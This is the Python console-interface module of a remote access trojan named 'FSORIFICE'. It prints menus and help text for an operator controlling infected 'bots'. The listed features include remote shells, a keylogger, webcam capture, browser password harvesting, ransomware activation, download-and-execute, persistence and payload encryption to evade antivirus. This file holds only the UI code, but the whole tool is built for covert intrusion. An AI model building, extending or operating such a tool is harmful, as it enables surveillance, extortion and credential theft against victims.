import subprocess as sp
import sys
import termcolor

class ui_console:

    def __init__(self):
        self.username = ''
        self.password = ''

    def print_banner(self):
        print "\n"
        print " @@@@@@@@  @@@@@@  @@@@@@  @@@@@@@  @@@ @@@@@@@@ @@@  @@@@@@@ @@@@@@@@@"
        print " @@!      !@@     @@!  @@@ @@!  @@@ @@! @@!      @@! !@@      @@!      "
        print " @!!!:!    !@@!!  @!@  !@! @!@!!@!  !!@ @!!!:!   !!@ !@!      @!!!:!!  "
        print " !!:          !:! !!:  !!! !!: :!!  !!: !!:      !!: :!!      !!:      "
        print "   :       ::.: :   : :. :   :   : : :    :       :    :: :: : : :: :::"
        print "\n"
        print "[---]                        FSORIFICE                            [---]"
        print "[---]                    Remote Access Tool                       [---]"
        print "[---]               Created by: decimate@fsociety                 [---]"
        print "[---]                      Version: 0.7                           [---]"
        print

    def print_about(self):
        print "\n FSORIFICE - Version: 0.7"
        print " Copyright 2017 FSORIFICE"
        print " Created by: decimate@fsociety\n"
        print " Features:"
        print " - interactive shell (cmd.exe, powershell.exe, /bin/sh, /bin/bash, ...)"
        print " - file handler (download, upload, execute)"
        print " - keylogger, screenshot, webcam snapshot, VNC"
        print " - persistence (install and autostart)"
        print " - browser credential harvester"
        print " - remote shutdown/reboot/logoff"
        print

    def print_mainmenu(self):
        print " 0) Show Options          - display current user configuration"
        print " 1) Configuration         - configure both server side and the client side"
        print " 2) Startup/Resume Server - start listening for incoming connections"
        print " 3) Generate Payload      - generate a payload for your targets"
        print " 4) Crypt Payload         - encrypt the payload to evade av detection"
        print " 5) About                 - information about FSORIFICE\n"
        print "99) Exit                  - exit FSORIFICE."
        print

    def print_listener_help(self):
        print "[+] Available commands:     ()-Optional  <>-Arbitrary"
        print "  - help                  - display this help info"
        print "  - exit                  - shutdown listener and return to main menu"
        print "  - clear                 - clear current screen"
        print "  - info<sid>             - fetch informations about a specific bot"
        print "  - sessions(sid)         - list/interact with established session(s)"
        print "  - broadcast<command>    - broadcast a command to all bots"
        print "  - read<sid><filepath>   - execute a list of commands from a file"
        print

    def print_session_help(self):
        print "[+] Available commands:"
        print "  - admin/interactive_shell              - open an interactive command shell"
        print "  - admin/shell_exec@<command>           - execute shell commands on remote host"
        print "  - exploit/ransom@<lock/unlock>         - activate or deactivate ransomware on remote host"
        print "  - gather/keylogger(@savepath)          - retrieve the keylog file from the remote host"
        print "  - gather/screenshot(@savepath)         - take a screenshot of the remote host's screen"
        print "  - gather/webcamsnap(@savepath)         - take a snapshot with the remote host's webcam"
        print "  - gather/vncserver@<start/stop>        - Startup VNC server on the remote host"
        print "  - gather/harvest@<browser_name>        - recover all stored password from the specified browser(s)"
        print "  - gather/erase@<browser_name>          - wipe all data including Cookies, History of the specified browser(s)"
        print "  - manage/download@<filepath>           - download a specific file from the remote host"
        print "  - manage/upload@<filepath>             - upload a specific file to the remote host"
        print "  - manage/execute@<filepath>            - open/execute a specific file on the remote host"
        print "  - manage/downexec@<url>                - download and execute a specific file on the remote host"
        print "  - network/visiturl@<url>               - open an URL with the default browser"
        print "  - troll/popup_msg@<title>,<message>    - display a popup message box with specific text"
        print "  - troll/texttospeech@<message>         - convert custom text to audio"
        print "  - general/reboot@<time>                - reboot the remote host after 5 secs"
        print "  - general/shutdown@<time>              - shutdown the remote host after 5 secs"
        print "  - general/logoff@<time>                - logoff the remote host after 5 secs"
        print "  - general/update@<url>                 - download and install payload update from an url"
        print "  - general/uninstall                    - uninstall the trojan on the remote host"
        print "  - general/disconnect                   - disconnect the remote host from the server"
        print "  - exit                                 - exit current session (you may come back later)"
        print

    def print_module_help(self, md_name):
        if md_name == '':
            print 'Unknown module'
        elif md_name == 'info':
            print "Usage: info <sid> - Fetch informations about a specific bot\n"
        elif md_name == 'sessions':
            print "Usage: sessions -l       - List all established sessions"
            print "       sessions -i <sid> - Interact with a specific session\n"
        elif md_name == 'broadcast':
            print "Usage: broadcast <sid> - Broadcast a command to all bots\n"
        elif md_name == 'read':
            print "Usage: read <sid> <file> - Execute a list of commands from a file\n"
        else:
            print 'Unknown module'


    def log(self, err_msg):
        self.err_format = termcolor.colored(err_msg, "red", attrs =["bold"])
        print("{}".format(self.err_format)),
        print

    def note(self, note_msg):
        self.note_format = termcolor.colored(note_msg, "green", attrs =["bold"])
        print("{}".format(self.note_format))

    def session(self, s_msg):
        self.s_format = termcolor.colored(s_msg, "green", attrs =["bold"])
        print("{}".format(self.s_format)),

    def clear(self):
        self.tmp = sp.call('clear', shell=True)

    def login(self):
        self.password = raw_input("[+] PASSWORD: ")


    def confirm_exit(self, message):
        while True:
            self.choice = raw_input("[*] Do you want to " + message + "? (Y/n):")
            if self.choice == "Y":
                sys.exit(0)
            elif self.choice == "n":
                print
                break
            else:
                self.log("[-] Error: Invalid Option. Retry.")
                print
                continue
